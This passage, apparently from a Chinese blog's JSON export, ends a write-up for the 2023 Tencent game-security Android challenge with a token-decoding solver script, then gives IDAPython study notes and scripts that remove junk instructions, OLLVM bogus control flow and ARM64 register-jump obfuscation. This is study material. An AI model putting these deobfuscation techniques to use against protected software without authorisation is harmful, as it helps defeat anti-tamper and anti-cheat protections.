= (byte2 - 8) ^ 182 byte3 = (byte3 - 16) - 55 byte4 = (byte4 - 24) ^ 152 input = struct.pack(\">4B\", byte1 &amp; 0xff, byte2 &amp; 0xff, byte3 &amp; 0xff, byte4 &amp; 0xff) return int.from_bytes(input, 'little')def dec_2(input): input_byte = bytearray(input.to_bytes(4, 'big')) xor_arr = [50, -51, -1, -104, 25, -78, 0x7C, -102] for i in range(4): input_byte[i] = (input_byte[i] - i) &amp; 0xff input_byte[i] = (input_byte[i] ^ xor_arr[i]) &amp; 0xff input = int.from_bytes(input_byte, 'big') input = (input &lt;&lt; 7 | input >> 25) &amp; 0xffffffff input = int.from_bytes(input.to_bytes(4, 'little'), 'big') # 字节再次翻转 return inputdef dec_1(input): input_byte = bytearray(input.to_bytes(8, 'little')) for i in range(len(input_byte)): index = i % 4 input_byte[i] = (algorithm_1[(index, \"dec\")]((input_byte[i] + 8 * index) &amp; 0xff)) ^ index return int.from_bytes(input_byte, 'little')token = int(input(\"enter the token plz~:\"))input_low,input_high = token,0#xteainput_low,input_high=dec_xtea(input_low, input_high)#vminput_low,input_high = dec_vm_low(input_low),dec_vm_high(input_high)#bswap32input = struct.pack('&lt;2I', input_low, input_high)input_low, input_high = struct.unpack('>2I', input)#高 / 低 32 位对调input_low, input_high=input_high, input_low#blackObfuscatorinput_high = dec_2(input_high)input_low = dec_2(input_low)#last decryptinput = struct.pack('>2I', input_low, input_high)input=int.from_bytes(input,'little')input = dec_1(input)#outputprint(input)# 参考资料 ELF 文件格式的详解 [原创] 2023 腾讯游戏安全竞赛初赛题解 (安卓) [原创] 2023 腾讯游戏安全大赛 - 安卓赛道初赛 wp [原创] 腾讯游戏安全技术竞赛 2023 安卓客户端初赛 WriteUp ARMv8 (aarch64) 指令集特性","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://oacia.dev/tags/android/"}]},{"title":"IDApython学习笔记","slug":"idapython-learning","date":"2023-08-24T10:14:21.000Z","updated":"2025-04-08T18:55:11.706Z","comments":true,"path":"idapython-learning/","link":"","permalink":"https://oacia.dev/idapython-learning/","excerpt":"","text":"IDApython 在日常逆向的过程中是十分重要的存在，过去零零散散的接触过一些 idapython, 但是我觉得还是有必要去系统的整理一下相关的函数，以便未来倘若忘记了可以快速通过这篇笔记回忆起来 # 官方文档 IDA Help: Alphabetical list of IDC functions IDAPython documentation # IDApython 编写环境 PyCharm 2021.2.3 社区版 IDA7.7 python3.8 由于 IDA 自带的 IDE 没有代码补全十分的难用，所以我准备在 PyCharm 中编写 IDApython 代码 在 pycharm 中进入到 文件--&gt;设置--&gt;项目: xxx.py--&gt;Python解释器 ，然后点击此处的 全部显示 如图 然后点击该位置来添加自定义路径 将 IDA安装路径\\python\\3 添加至解释器路径中如图 点击确定之后，在 Pycharm 中即可实现 IDApython 代码补全 当然啦，我们也可以直接在 windows 中添加 PYTHONPATH 的环境变量，同样可以做到 idapython 的代码补全 # 地址 address idc.get_screen_ea()#获取当前光标所在地址idc.get_inf_attr(INF_MAX_EA)#获取本文件的最大地址idc.get_inf_attr(INF_MIN_EA)#获取本文件的最小地址idaapi.get_imagebase()#获取文件的基址idc.next_head(ea)/idc.prev_head(ea)#获取下一条 / 上一条指令的地址# 判断当前地址是否在程序中存在if idaapi.BADADDR != ea: print(\"valid address\")# 反汇编 disasm idc.GetDisasm(ea)#获取某一个地址的反编译汇编指令idc.print_insn_mnem(ea)#返回助记符，get mnemonicidc.print_operand(ea,n)#返回第 n + 1 个参数idc.get_operand_value(ea,n)#返回第 n + 1 个参数的数值形式idc.get_item_size(ea)#获取某行汇编的长度举个例子 ea = here()print(idc.GetDisasm(ea))# mov eax, [rbp+var_4]print(idc.print_insn_mnem(ea))# movprint(idc.print_operand(ea, 0))# eaxprint(idc.print_operand(ea, 1))# [rbp+var_4]# 段 segment idc.get_segm_name(ea)#获取地址所在段的段名idc.get_segm_start(ea)/idc.get_segm_end(ea)#获取地址所在段起始 / 结束地址idautils.Segments()#获取所有的段首地址idc.get_first_seg()/idc.get_next_seg() # 获取第一个段 / 下一个段的地址idc.get_segm_attr(ea,attr)/idc.set_segm_attr(ea,attr,value) # 获取 / 设置函数的属性ida_segment.get_segm_by_name('.text')#通过 name 来获取段对象举个例子 #遍历所有的段for i in idautils.Segments(): print(f\"%s:\\t0x%x\\t0x%x\" %( idc.get_segm_name(i), idc.get_segm_start(i), idc.get_segm_end(i)))# 通过名称来获取段对象sg = ida_segment.get_segm_by_name('.text') print(sg.start_ea,sg.end_ea,sg.size())# 函数 function idc.get_func_name(ea)#通过地址获取函数名idaapi.get_func(ea)#通过地址获取地址所在的函数idc.get_next_func(ea)/idc.get_prev_func(ea) # 获取当前函数的前一个 / 后一个函数的地址idautils.Functions(start, end)#获取所有函数的首地址，若没有参数，则默认从头到尾idc.get_func_attr(func, FUNCATTR_FLAGS)#检索函数的信息举个例子 #遍历所有函数for func in idautils.Functions(): print(hex(func), idc.get_func_name(func),sep=':')#获取函数的起始 / 结束地址func = idaapi.get_func(ea)print(func.start_ea, func.end_ea)#检索关于函数的信息，来判断该函数是否是库中代码，或者函数是否有返回值等等for func in idautils.Functions():#获取所有已知的函数首地址 flags = idc.get_func_attr(func, FUNCATTR_FLAGS)#获取标志 if flags &amp; FUNC_NORET: print(hex(func), get_func_name(func), \"FUNC_NORET\") if flags &amp; FUNC_FAR: print(hex(func), get_func_name(func),\"FUNC_FAR\") if flags &amp; FUNC_LIB: print(hex(func), get_func_name(func),\"FUNC_LIB\") if flags &amp; FUNC_STATIC: print(hex(func), get_func_name(func),\"FUNC_STATIC\") if flags &amp; FUNC_FRAME: print(hex(func), get_func_name(func),\"FUNC_FRAME\") if flags &amp; FUNC_USERFAR: print(hex(func), get_func_name(func),\"FUNC_USERFAR\") if flags &amp; FUNC_HIDDEN: print(hex(func), get_func_name(func),\"FUNC_HIDDEN\") if flags &amp; FUNC_THUNK: print(hex(func), get_func_name(func),\"FUNC_THUNK\") if flags &amp; FUNC_LIB: print(hex(func), get_func_name(func),\"FUNC_BOTTOMBP\")各个函数标志的含义如下 函数标志 含义 FUNC_NORET 这个标志表示某个函数是否有返回值，它本身的值是 1，下面是一个没有返回值的函数，注意它没有函数的最后并不是 ret 或者 leave 指令。 FUNC_FAR 这个标志非常少的出现，标志程序是否使用分段内存，它的值为 2。 FUNC_USERFAR 少见 FUNC_LIB 这个表示用于寻找库函数的代码。识别库函数代码是非常有必要的，因为我们在分析的时候一般将其跳过，它的值是 4。 FUNC_STATIC 静态函数 FUNC_FRAME 这个标志表示函数是否使用了 ebp 寄存器 (帧指针)，使用 ebp 寄存器的函数通常有如下的语法设定，目的是为了保存栈帧。 FUNC_BOTTOMBP 和 FUNC_FRAME 一样，该标志用于跟踪帧指针 (ebp)。它作用是识别函数中帧指针是 否等于堆栈指针 (esp)。 FUNC_HIDDEN 带有 FUNC_HIDDEN 标志的函数意味着它们是隐藏的，这个函数需要展开才能查看。如 果我们跳转到一个标记为 HIDDEN 的地址的话，它会自动的展开。 FUNC_THUNK 表示这个函数是否是一个 thunk 函数，thunk 函数表示的是一个简单的跳转函数。 # 块 block 遍历一个函数中的块 import idaapiimport idcf_blocks = idaapi.FlowChart(idaapi.get_func(0x401E80), flags=idaapi.FC_PREDS)for block in f_blocks: print(hex(block.start_ea),hex(block.end_ea),hex(idc.prev_head(block.end_ea)),block.id)# 特别注意，block.end_ea 表示下一个块的起始地址，并不是当前块的结束地址！！，idc.prev_head (block.end_ea) 才是获取这个块的结束地址获取 block 的前驱块 import idaapif_blocks = idaapi.FlowChart(idaapi.get_func(0x401E80), flags=idaapi.FC_PREDS)block = f_blocks[1]# 获取当前块的前驱块for pred in block.preds(): print(\"前驱块\",hex(pred.start_ea),pred.id)获取 block 的后继块 import idaapif_blocks = idaapi.FlowChart(idaapi.get_func(0x401E80), flags=idaapi.FC_PREDS)block = f_blocks[1]# 获取当前块的后继块for succ in block.succs(): print(\"后继块\",hex(succ.start_ea),succ.id)获取块的开始地址和结束地址 import idaapif_blocks = idaapi.FlowChart(idaapi.get_func(0x401E80), flags=idaapi.FC_PREDS)block = f_blocks[1]print (hex (block.start_ea),hex (idc.prev_head (block.end_ea)))# 获取块的开始地址 / 结束地址# 操作数 可以通过 idc.get_operand_type(curr_addr, n) 获取第 n+1 个操作数的类型，返回值有八种情况，值和含义如下 操作数 值 含义 o_void 0 指令没有任何操作数，如 retn o_reg 1 操作数是寄存器 o_mem 2 操作数是直接寻址的内存，这种类型对寻找 DATA 的引用非常有帮助。如 cmp ds:dword_A152B8, 0 o_phrase 3 操作数是利用基址寄存器和变址寄存器的寻址操作的话，如 mov [edi+ecx], eax o_displ 4 操作数是利用寄存器和位移的寻址操作的话，如 mov eax, [edi+18h] o_imm 5 操作数是一个确定的数值，如 add esp, 0Ch o_far 6 这种返回类型在 x86 和 x86_64 的逆向中不常见。它用来判断直接访问远端地址的操作数 o_near 7 这种返回类型在 x86 和 x86_64 的逆向中不常见。它用来判断直接访问近端地址的操作数 # 判断在 curr_addr 的指令的第一个操作数的类型是否为利用寄存器和位移的寻址操作insn = ida_ua.insn_t()idaapi.decode_insn(insn, curr_addr)if insn.Op1.type == idaapi.o_displ: print(\"第一个操作数的类型是利用寄存器和位移的寻址操作!\")# insn 的各个属性Python>dir(insn)['Op1', 'Op2', 'Op3', 'Op4', 'Op5', 'Op6', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get_auxpref__', '__get_operand__', '__get_ops__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__set_auxpref__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__swig_destroy__', '__weakref__', 'add_cref', 'add_dref', 'add_off_drefs', 'assign', 'auxpref', 'create_op_data', 'create_stkvar', 'cs', 'ea', 'flags', 'get_canon_feature', 'get_canon_mnem', 'get_next_byte', 'get_next_dword', 'get_next_qword', 'get_next_word', 'insnpref', 'ip', 'is_64bit', 'is_canon_insn', 'is_macro', 'itype', 'ops', 'segpref', 'size', 'this', 'thisown']# 搜索 idc.FindBinary(ea,flag, searchstr, radix=16)#字节或者二进制的搜索idc.FindBinary(ea,flag, searchstr, radix=16) 中 flag 的各个类型的含义 类型 值 含义 SEARCH_UP 0 向上搜索 SEARCH_DOWN 1 向下搜索 SEARCH_NEXT 2 获取下一个已经找到的对象 SEARCH_CASE 4 指明是否区分大小写 SEARCH_REGEX 8 正则搜索 SEARCH_NOBRK 16 SEARCH_NOSHOW 32 指明是否显示搜索的进度 SEARCH_UNICODE 64 将所有搜索字符串视为 Unicode SEARCH_IDENT 128 SEARCH_BRK 256 举个例子 pattern = '55 48 89 E5'addr = ida_ida.inf_get_min_ea()for x in range(0,5): addr = idc.find_binary(addr, SEARCH_DOWN|SEARCH_NEXT, pattern) if addr != idc.BADADDR: print(hex(addr), idc.GetDisasm(addr))# 数据 ida_bytes.get_bytes(ea,size)ida_bytes.get_byte(ea)ida_bytes.get_word(ea)ida_bytes.get_dword(ea)ida_bytes.get_qword(ea)# 动态调试 idc.add_bpt(long Address)#在指定的地址设置断点idc.get_reg_value(string Register)#获取一个寄存器的名称idc.set_reg_value(long Value, string Register)#设置寄存器的值idc.run_to(long Address)#运行到指定的地址，然后停下。idc.wait_for_next_event(wfne,timeout)#等待下一个事件，此函数会继续执行进程，并等待调试器事件直到超时在 idc.wait_for_next_event(wfne,timeout) 中参数即返回值的标志如下 wfne 标志 // wfne flag is combination of the following:#define WFNE_ANY 0x0001 // return the first event (even if it doesn't suspend the process) // if the process is still running, the database // does not reflect the memory state. you might want // to call refresh_debugger_memory() in this case#define WFNE_SUSP 0x0002 // wait until the process gets suspended#define WFNE_SILENT 0x0004 // 1: be slient, 0:display modal boxes if necessary#define WFNE_CONT 0x0008 // continue from the suspended state#define WFNE_NOWAIT 0x0010 // do not wait for any event, immediately return DEC_TIMEOUT // (to be used with WFNE_CONT)#define WFNE_USEC 0x0020 // timeout is specified in microseconds // (minimum non-zero timeout is 40000us) timeout ，等待的秒数，-1 为无限大 返回值 debugger event codes // debugger event codes#define NOTASK -2 // process does not exist#define DBG_ERROR -1 // error (e.g. network problems)#define DBG_TIMEOUT 0 // timeout#define PROCESS_STARTED 0x00000001 // New process started#define PROCESS_EXITED 0x00000002 // Process stopped#define THREAD_STARTED 0x00000004 // New thread started#define THREAD_EXITED 0x00000008 // Thread stopped#define BREAKPOINT 0x00000010 // Breakpoint reached#define STEP 0x00000020 // One instruction executed#define EXCEPTION 0x00000040 // Exception#define LIB_LOADED 0x00000080 // New library loaded#define LIB_UNLOADED 0x00000100 // Library unloaded#define INFORMATION 0x00000200 // User-defined information#define PROCESS_ATTACHED 0x00000400 // Attached to running process#define PROCESS_DETACHED 0x00000800 // Detached from process#define PROCESS_SUSPENDED 0x00001000 // Process has been suspended # patch ida_bytes.patch_bytes(ea, bytes)ida_bytes.patch_byte(ea, byte)ida_bytes.patch_word(ea, word)ida_bytes.patch_dword(ea, dword)ida_bytes.patch_qword(ea, qword)# IDApython 常用脚本 # 打印 IDA 函数列表 import idautilsimport idcfunc_addr = []func_name = []for i in idautils.Functions(): func_addr.append(i) func_name.append(idc.get_func_name(i))for i in func_addr: print(f\"&#123;hex(i)&#125;, \",end='')print('')for i in func_name: print(f\"\\\"&#123;i&#125;\\\", \",end='')# 批量去除花指令 import idcimport ida_bytesimport ida_segmentdef my_nop(addr, endaddr): while addr &lt; endaddr: ida_bytes.patch_byte(addr, 0x90) addr += 1pattern = [\"74 15 75 13 8D 44 24 FC 83 F0 22 3B 04 24 74 0A E8 1F 00 00 00 74 04\", \"74 0A 75 08 E8 10 00 00 00 EB 04 E8\", \"48 81 EC 08 03 00 00\"]text_seg = ida_segment.get_segm_by_name(\".text\")start, end = text_seg.start_ea, text_seg.end_eafor i in range(len(pattern)): cur_addr = start end_addr = end while cur_addr &lt; end_addr: cur_addr = idc.find_binary(cur_addr, idc.SEARCH_DOWN, pattern[i]) print(\"patch address: \" + hex(cur_addr)) # 打印提示信息 if cur_addr == idc.BADADDR: break else: my_nop(cur_addr, cur_addr + len(pattern[i].split(' '))) cur_addr = idc.next_head(cur_addr)# 去除 BCF 虚假控制流 更多细节请参考 ollvm 三种混淆模式的反混淆思路 # 去除虚假控制流 idapython 脚本import ida_xrefimport ida_idaapifrom ida_bytes import get_bytes, patch_bytes # 将 mov 寄存器，不透明谓词 修改为 mov 寄存器，0def do_patch(ea): if get_bytes(ea, 1) == b\"\\x8B\": # mov eax-edi, dword reg = (ord(get_bytes(ea + 1, 1)) &amp; 0b00111000) >> 3 patch_bytes(ea, (0xB8 + reg).to_bytes(1,'little') + b'\\x00\\x00\\x00\\x00\\x90\\x90') else: print('error') # 不透明谓词在.bss 段的范围seg = ida_segment.get_segm_by_name('.bss')start = seg.start_eaend = seg.end_ea for addr in range(start,end,4): ref = ida_xref.get_first_dref_to(addr) print(hex(addr).center(20,'-')) # 获取所有交叉引用 while(ref != ida_idaapi.BADADDR): do_patch(ref) print('patch at ' + hex(ref)) ref = ida_xref.get_next_dref_to(addr, ref) print('-' * 20)# 去除寄存器跳转混淆 仅供参考，需要根据实际情况进行调整！ arm64 架构上的 csel-br 及 cset-br 类型寄存器跳转 这个脚本是我在做腾讯游戏安全 2023 的安卓题时写的，更多细节可以参阅细品 sec2023 安卓赛题 import ida_segmentimport idautilsimport idcimport ida_bytesfrom keystone import *def patch_nop(begin, end): # arm64 中的 NOP 指令是 b'\\x1F\\x20\\x03\\xD5' while end > begin: ida_bytes.patch_bytes(begin, b'\\x1F\\x20\\x03\\xD5') begin = begin + 4# 获取 text 段的起始地址text_seg = ida_segment.get_segm_by_name(\".text\")start, end = text_seg.start_ea, text_seg.end_ea# start, end = 0x3BA34, 0x3BA80# start, end = 0x37390,0x373B4# 测试 ADRP 指令# start, end = 0x3FCE0, 0x3FD00 # 测试 EQ 情况#start, end = 0x3AA90, 0x3AAA4# start, end = 0x3A078, 0x3A090# 测试 CSET-BR 去除情况current_addr = start# print(text_seg.start_ea,text_seg.end_ea)nop_addr_array_after_finish = [] # 在 CSEL/CSET-BR 结构修复完成后需要 NOP 的指令while current_addr &lt; end: # 处理 CSEL-BR 结构 if idc.print_insn_mnem(current_addr) == \"CSEL\": CSEL_addr = current_addr nop_addr_array_temp = [] nop_addr_array_temp.append(CSEL_addr) BR_addr = 0 BR_reg = \"\" temp_addr = idc.next_head(current_addr) for _ in range(9): # 向下搜寻 9 条指令，寻找是否有 BR 指令 if idc.print_insn_mnem(temp_addr) == \"BR\": BR_addr = temp_addr BR_reg = idc.print_operand(temp_addr, 0) break if idc.print_insn_mnem(temp_addr) == \"CSEL\": break temp_addr = idc.next_head(temp_addr) if BR_addr != 0: # 匹配到了 CSEL-BR 结构的汇编，需要去除 # 形如 CSEL X11, X12, X11, GE, 获取 CSEL 后的操作数 op1~3, 以及条件码 cond CSEL_op1 = idc.print_operand(CSEL_addr, 0) CSEL_op2 = idc.print_operand(CSEL_addr, 1) CSEL_op2_val = -1 CSEL_op3 = idc.print_operand(CSEL_addr, 2) CSEL_op3_val = -1 CSEL_cond = idc.print_operand(CSEL_addr, 3) # 读取条件分支语句 CSEL 中要赋值给目标寄存器的两个源寄存器中存储的值 temp_addr = idc.prev_head(CSEL_addr) while (CSEL_op2_val == -1 or CSEL_op3_val == -1) and temp_addr > text_seg.start_ea: if CSEL_op2 == \"XZR\": # 如果寄存器的值是 XZR, 说明该值为 0 CSEL_op2_val = 0 if CSEL_op3 == \"XZR\": CSEL_op3_val = 0 if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] == CSEL_op2[ 1::] and CSEL_op2_val == -1: # 寄存器 X11 和 W11 是同一个寄存器 CSEL_op2_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_operand(temp_addr, 0)[1::] == CSEL_op3[1::] and CSEL_op3_val == -1: CSEL_op3_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) temp_addr = idc.prev_head(temp_addr) # print(CSEL_op2_val, CSEL_op3_val, hex(current_addr)) assert CSEL_op2_val != -1 and CSEL_op3_val != -1 temp_addr = BR_addr jump_array_reg = \"\" # 存贮跳转表的寄存器名称 jump_array_addr = -1 # 跳转表所在的位置 add_reg = [] # 加到跳转表的值所在的寄存器 add_val = -1 # 加到跳转表的值 while temp_addr > CSEL_addr: # 从后往前找，以 BR 所在的地址开始，CSEL 所在的地址结束，匹配必要的寄存器名称和值 # print(hex(temp_addr),idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADD\" and idc.print_operand(temp_addr, 0) == BR_reg: add_reg.append(idc.print_operand(temp_addr, 1)[1::]) add_reg.append(idc.print_operand(temp_addr, 2)[1::]) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"LDR\": jump_array_reg = idc.print_operand(temp_addr, 1)[1:-1].split(',')[0] # 获取存储跳转表的寄存器名称 nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"ADRL\": jump_array_reg = idc.print_operand(temp_addr, 0) jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) temp_addr = idc.prev_head(temp_addr) # 如果在 CSEL-BR 间的指令中没找到跳转表所在的位置，则向上寻找 if jump_array_addr == -1: temp_addr = CSEL_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADRL\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break elif idc.print_insn_mnem(temp_addr) == \"ADRP\": # ADRP 指令，还需要加上另一部分 if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) while temp_addr &lt; text_seg.end_ea: if idc.print_insn_mnem(temp_addr) == \"ADD\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr += idc.get_operand_value(temp_addr, 2) nop_addr_array_temp.append(temp_addr) break temp_addr = idc.next_head(temp_addr) break temp_addr = idc.prev_head(temp_addr) # print(hex(jump_array_addr),hex(add_val)) if add_val == -1: temp_addr = CSEL_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg and idc.print_operand(temp_addr, 0)[0] == 'X': add_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break temp_addr = idc.prev_head(temp_addr) # 计算出分支跳转的两个位置 branch_a = (ida_bytes.get_qword(jump_array_addr + CSEL_op2_val) + add_val) &amp; 0xffffffffffffffff branch_b = (ida_bytes.get_qword(jump_array_addr + CSEL_op3_val) + add_val) &amp; 0xffffffffffffffff # print(hex(branch_a), hex(branch_b)) # print(CSEL_cond,hex(current_addr)) # GE&lt;->LT 有符号大于等于 vs 有符号小于 # EQ&lt;->NE 结果相等 vs 结果不相等 # CC&lt;->CS 无符号小于 vs 无符号大于等于 # HI&lt;->LS 无符号大于 vs 无符号小于等于 # if CSEL_cond == \"GE\":# 构造 B.LT 跳转 logic_rev = &#123;\"GE\": \"LT\", \"LT\": \"GE\", \"EQ\": \"NE\", \"NE\": \"EQ\", \"CC\": \"CS\", \"CS\": \"CC\", \"HI\": \"LS\", \"LS\": \"HI\"&#125; ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN) code = \"\" if branch_b == idc.next_head(BR_addr): # 判断逻辑不取反 code = f\"B.&#123;CSEL_cond&#125; #&#123;hex(branch_a)&#125;\" elif branch_a == idc.next_head(BR_addr): # 判断逻辑取反 code = f\"B.&#123;logic_rev[CSEL_cond]&#125; #&#123;hex(branch_b)&#125;\" #print(hex(current_addr), hex(add_val), CSEL_op2_val, CSEL_op3_val, hex(jump_array_addr), code) # 修复 BR 跳转 if code != \"\": patch_br_byte, count = ks.asm(code, addr=BR_addr) ida_bytes.patch_bytes(BR_addr, bytes(patch_br_byte)) print(f\"fix CSEL-BR at &#123;hex(BR_addr)&#125;\") nop_addr_array_after_finish.extend(nop_addr_array_temp) current_addr = idc.next_head(BR_addr) continue else: print(f\"error! unable to fix CSEL-BR at &#123;hex(current_addr)&#125;,branch:&#123;hex(branch_a)&#125;, &#123;hex(branch_b)&#125;\") # 处理 CSET-BR 结构 elif idc.print_insn_mnem(current_addr) == \"CSET\": CSET_addr = current_addr nop_addr_array_temp = [] nop_addr_array_temp.append(CSET_addr) BR_addr = 0 BR_reg = \"\" temp_addr = idc.next_head(current_addr) for _ in range(15): # 向下搜寻 15 条指令，寻找是否有 BR 指令 if idc.print_insn_mnem(temp_addr) == \"BR\": BR_addr = temp_addr BR_reg = idc.print_operand(temp_addr, 0) break elif idc.print_insn_mnem(temp_addr) == \"CSEL\": break elif idc.print_insn_mnem(temp_addr) == \"RET\": break temp_addr = idc.next_head(temp_addr) if BR_addr != 0: # 匹配到了 CSET-BR 结构的汇编，需要去除 # 形如 CSET W23, NE, 获取 CSET 后的操作数 op1, 以及条件码 cond CSET_op1 = idc.print_operand(CSET_addr, 0) CSET_op1_val = -1 CSET_cond = idc.print_operand(CSET_addr, 1) temp_addr = BR_addr jump_array_reg = \"\" # 存贮跳转表的寄存器名称 jump_array_addr = 0 # 跳转表所在的位置 add_reg = [] # 加到跳转表的值所在的寄存器 add_val = 0 # 加到跳转表的值 Lshift_val = -1 while temp_addr > CSET_addr: # 从后往前找，以 BR 所在的地址开始，CSET 所在的地址结束，匹配必要的寄存器名称和值 # print(hex(temp_addr),idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADD\" and idc.print_operand(temp_addr, 0) == BR_reg: add_reg.append(idc.print_operand(temp_addr, 1)[1::]) add_reg.append(idc.print_operand(temp_addr, 2)[1::]) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"MOVK\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val += (idc.get_operand_value(temp_addr, 1) &lt;&lt; 16) elif idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val += idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"LDR\": LDR_temp = idc.print_operand(temp_addr, 1)[1:-1].split(',') jump_array_reg = LDR_temp[0] # 获取存储跳转表的寄存器名称 if len(LDR_temp) == 3: Lshift_val = int(LDR_temp[2][-1:]) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"ADRL\": jump_array_reg = idc.print_operand(temp_addr, 0) jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"LSL\": if idc.print_operand(temp_addr, 0)[1::] == CSET_op1[1::]: Lshift_val = idc.get_operand_value(temp_addr, 2) temp_addr = idc.prev_head(temp_addr) # 如果在 CSET-BR 间的指令中没找到跳转表所在的位置，则向上寻找 if jump_array_addr == 0: temp_addr = CSET_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADRL\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break elif idc.print_insn_mnem(temp_addr) == \"ADRP\": # ADRP 指令，还需要加上另一部分 if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) while temp_addr &lt; text_seg.end_ea: if idc.print_insn_mnem(temp_addr) == \"ADD\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr += idc.get_operand_value(temp_addr, 2) nop_addr_array_temp.append(temp_addr) break temp_addr = idc.next_head(temp_addr) break temp_addr = idc.prev_head(temp_addr) # print(hex(jump_array_addr),hex(add_val)) # 向上寻找加到跳转表的值 if add_val == 0: temp_addr = CSET_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break elif idc.print_insn_mnem(temp_addr) == \"MOVK\": # 形如 MOV W9, #0x76BC;MOVK W9, #0x4C48,LSL#16; 的形式 if idc.print_operand(temp_addr, 0)[1::] in add_reg: # print(hex(add_val)) add_val = (idc.get_operand_value(temp_addr, 1) &lt;&lt; 16) # print(hex(add_val)) while temp_addr > text_seg.start_ea: if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val += idc.get_operand_value(temp_addr, 1) # print(hex(add_val)) break temp_addr = idc.prev_head(temp_addr) break temp_addr = idc.prev_head(temp_addr) # print(hex(current_addr)) # 计算出分支跳转的两个位置 branch_a = (ida_bytes.get_qword(jump_array_addr + (1 &lt;&lt; Lshift_val)) + add_val) &amp; 0xffffffffffffffff branch_b = (ida_bytes.get_qword(jump_array_addr + (0 &lt;&lt; Lshift_val)) + add_val) &amp; 0xffffffffffffffff # print(hex(branch_a), hex(branch_b)) # print(CSEL_cond,hex(current_addr)) # GE&lt;->LT 有符号大于等于 vs 有符号小于 # EQ&lt;->NE 结果相等 vs 结果不相等 # CC&lt;->CS 无符号小于 vs 无符号大于等于 # HI&lt;->LS 无符号大于 vs 无符号小于等于 # if CSEL_cond == \"GE\":# 构造 B.LT 跳转 logic_rev = &#123;\"GE\": \"LT\", \"LT\": \"GE\", \"EQ\": \"NE\", \"NE\": \"EQ\", \"CC\": \"CS\", \"CS\": \"CC\", \"HI\": \"LS\", \"LS\": \"HI\"&#125; ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN) code = \"\" if branch_b == idc.next_head(BR_addr): # 判断逻辑不取反 code = f\"B.&#123;CSET_cond&#125; #&#123;hex(branch_a)&#125;\" elif branch_a == idc.next_head(BR_addr): # 判断逻辑取反 code = f\"B.&#123;logic_rev[CSET_cond]&#125; #&#123;hex(branch_b)&#125;\" # print(hex(current_addr),add_reg,hex(add_val),CSET_op1,CSET_op1_val,jump_array_reg,hex(jump_array_addr),Lshift_val,code) # 修复 BR 跳转 if code != \"\": patch_br_byte, count = ks.asm(code, addr=BR_addr) ida_bytes.patch_bytes(BR_addr, bytes(patch_br_byte)) print(f\"fix CSET-BR at &#123;hex(BR_addr)&#125;\") nop_addr_array_after_finish.extend(nop_addr_array_temp) current_addr = idc.next_head(BR_addr) continue else: print(f\"error! unable to fix CSET-BR at &#123;hex(current_addr)&#125;,branch:&#123;hex(branch_a)&#125;, &#123;hex(branch_b)&#125;\") current_addr = idc.next_head(current_addr)for addr in nop_addr_array_after_finish: patch_nop(addr, addr + idc.get_item_size(addr)) x86_64 架构的 jmp rax 类型寄存器跳转 例题点这里下载 ACTF-obfuse import ida_segmentimport idautilsimport idcimport ida_bytesimport binasciiimport refrom keystone import *def patch_nop(addr, endaddr): while addr &lt; endaddr: ida_bytes.patch_byte(addr, 0x90) addr += 1# 获取 